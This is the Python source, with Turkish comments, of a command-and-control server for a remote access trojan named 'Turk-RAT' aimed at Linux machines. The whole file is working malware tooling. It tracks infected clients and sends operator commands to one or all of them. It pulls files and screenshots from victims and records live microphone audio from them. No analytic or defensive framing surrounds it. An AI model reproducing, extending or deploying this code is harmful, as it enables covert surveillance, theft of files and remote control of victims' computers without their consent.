#!/usr/bin/env python3
"""
Turk-RAT C2 Server - Linux Clientlar İçin

"""

import socket
import threading
import time
import os
import json
import wave
import pyaudio
from colorama import Fore, Style, init
from datetime import datetime
import select

init(autoreset=True)

# ============== AYARLAR ==============
HOST = "0.0.0.0"
PORT = 4443
PING_INTERVAL = 15
BUFFER_SIZE = 16384
DOWNLOAD_DIR = "server_downloads"
os.makedirs(DOWNLOAD_DIR, exist_ok=True)
# =====================================

clients = {}
lock = threading.Lock()
counter = 0
selected_client = None
multi_mode = False
mic_active = {}

def log(msg):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"{Fore.CYAN}[{timestamp}] {msg}{Style.RESET_ALL}")

def set_keepalive(s):
    s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    try:
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 10)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 5)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)
    except: pass

# ============== PING (AYRI THREAD) ==============
def ping_all():
    while True:
        with lock:
            for addr, data in list(clients.items()):
                try:
                    data['conn'].send(b"PING\n")
                except:
                    remove_client(addr)
        time.sleep(PING_INTERVAL)

def remove_client(addr):
    global selected_client
    with lock:
        if addr in clients:
            try: clients[addr]['conn'].close()
            except: pass
            del clients[addr]
        if addr in mic_active:
            del mic_active[addr]
        if selected_client == addr:
            selected_client = None
    log(f"{Fore.RED}{addr} koptu{Style.RESET_ALL}")

# ============== DOSYA AL ==============
def receive_file(conn, fname):
    path = os.path.join(DOWNLOAD_DIR, fname)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "wb") as f:
        while True:
            try:
                data = conn.recv(BUFFER_SIZE)
                if not data: break
                if b"__DOSYA_BITTI__" in data:
                    f.write(data.replace(b"__DOSYA_BITTI__", b""))
                    break
                f.write(data)
            except: break
    log(f"{Fore.GREEN}{fname} → {path}{Style.RESET_ALL}")

# ============== CANLI SES ==============
def receive_mic_live(conn, addr):
    fname = f"mic_{addr[0]}_{int(time.time())}.wav"
    path = os.path.join(DOWNLOAD_DIR, fname)
    CHUNK = 1024
    with wave.open(path, 'wb') as wf:
        wf.setnchannels(1)
        p = pyaudio.PyAudio()
        wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
        wf.setframerate(44100)
        p.terminate()
        while addr in mic_active:
            try:
                data = conn.recv(CHUNK)
                if not data: break
                wf.writeframes(data)
            except: break
    log(f"{Fore.GREEN}Ses: {path}{Style.RESET_ALL}")

# ============== LİSTELE ==============
def show_list():
    with lock:
        print(f"{Fore.CYAN}{'=' * 80}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}BAĞLI CLIENT'LAR ({len(clients)}){Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'=' * 80}{Style.RESET_ALL}")
        for i, (addr, data) in enumerate(clients.items(), 1):
            name = data['name']
            ip, port = addr
            info = data.get('info', {})
            os_ver = str(info.get("os", "?"))[:30]
            status = f"{Fore.YELLOW}SEÇİLİ{Style.RESET_ALL}" if addr == selected_client else f"{Fore.GREEN}AKTİF{Style.RESET_ALL}"
            print(f"{Fore.WHITE}[{i}] {name} → {ip}:{port} | {os_ver} | {status}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'=' * 80}{Style.RESET_ALL}")

# ============== CLIENT HANDLER (BUFFER YÖNETİMİ) ==============
def handle_client(conn, addr):
    global counter, selected_client
    counter += 1
    name = f"Client{counter}"
    log(f"{Fore.GREEN}{addr} → {name}{Style.RESET_ALL}")
    set_keepalive(conn)

    # Sistem bilgisi
    info = {}
    try:
        header = conn.recv(1024).decode(errors="ignore").strip()
        if header == "__LINUX__":
            info_json = conn.recv(4096).decode(errors="ignore")
            try: info = json.loads(info_json)
            except: info = {"os": "Bilinmiyor"}
    except: pass

    with lock:
        clients[addr] = {'conn': conn, 'name': name, 'info': info}

    if len(clients) == 1:
        selected_client = addr
        print(f"{Fore.GREEN}OTOMATİK SEÇİM: {name}{Style.RESET_ALL}")

    buffer = b""
    while addr in clients:
        try:
            # NON-BLOCKING + SELECT
            ready, _, _ = select.select([conn], [], [], 1.0)
            if not ready:
                continue

            data = conn.recv(BUFFER_SIZE)
            if not data:
                break
            buffer += data

            # SATIR SATIR İŞLE
            while b'\n' in buffer:
                line, buffer = buffer.split(b'\n', 1)
                line = line.strip()
                if not line: continue

                # PING YANIT
                if line == b"PONG":
                    continue

                # DOSYA BAŞLANGIÇ
                if line.startswith(b"__DOSYA_BASLA__"):
                    try:
                        header = line.decode().split("__DOSYA_BASLA__")[1]
                        fname, _ = header.split(":", 1)
                        threading.Thread(target=receive_file, args=(conn, fname), daemon=True).start()
                    except: pass
                    continue

                # NORMAL YANIT
                if selected_client == addr:
                    text = line.decode(errors='ignore')
                    print(f"{Fore.MAGENTA}{text}{Style.RESET_ALL}")

        except (ConnectionResetError, OSError):
            break
        except Exception as e:
            log(f"Handler hatası: {e}")
            break

    remove_client(addr)

# ============== ANA DÖNGÜ ==============
def main():
    global selected_client, multi_mode
    log(f"{Fore.YELLOW}Turk-RAT C2 @ {HOST}:{PORT}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}list | select 1 | multi | exit{Style.RESET_ALL}")

    threading.Thread(target=ping_all, daemon=True).start()

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(20)

    threading.Thread(target=lambda: [threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start() for conn, addr in iter(server.accept, None)], daemon=True).start()

    while True:
        try:
            prompt = f"{Fore.RED}Turk-RAT >> {Style.RESET_ALL}"
            if multi_mode:
                prompt = f"{Fore.MAGENTA}MULTI >> {Style.RESET_ALL}"
            elif selected_client and selected_client in clients:
                name = clients[selected_client]['name']
                prompt = f"{Fore.CYAN}{name} >> {Style.RESET_ALL}"

            cmd = input(prompt).strip()
            if not cmd: continue

            if cmd == "list":
                show_list()
                continue
            elif cmd.startswith("select "):
                try:
                    i = int(cmd.split()[1])
                    addr = list(clients.keys())[i-1]
                    selected_client = addr
                    print(f"{Fore.GREEN}Seçildi: {clients[addr]['name']}{Style.RESET_ALL}")
                except: print(f"{Fore.RED}Geçersiz ID{Style.RESET_ALL}")
                continue
            elif cmd == "multi":
                multi_mode = not multi_mode
                print(f"{Fore.MAGENTA}Multi: {'AKTİF' if multi_mode else 'KAPALI'}{Style.RESET_ALL}")
                continue
            elif cmd == "exit":
                break

            # GÖNDER
            targets = clients.keys() if multi_mode else [selected_client] if selected_client else []
            for addr in targets:
                if addr not in clients: continue
                try:
                    clients[addr]['conn'].send(cmd.encode() + b"\n")
                except: pass

            # DOSYA / MİKROFON
            if cmd.startswith("dosya_indir ") or cmd.startswith("screenshot "):
                fname = cmd.split(" ", 1)[1]
                threading.Thread(target=receive_file, args=(clients[selected_client]['conn'], fname), daemon=True).start()
            elif cmd == "mic live":
                mic_active[selected_client] = True
                threading.Thread(target=receive_mic_live, args=(clients[selected_client]['conn'], selected_client), daemon=True).start()

        except KeyboardInterrupt:
            break

    server.close()
    log(f"{Fore.RED}Sunucu kapandı{Style.RESET_ALL}")

if __name__ == "__main__":
    main()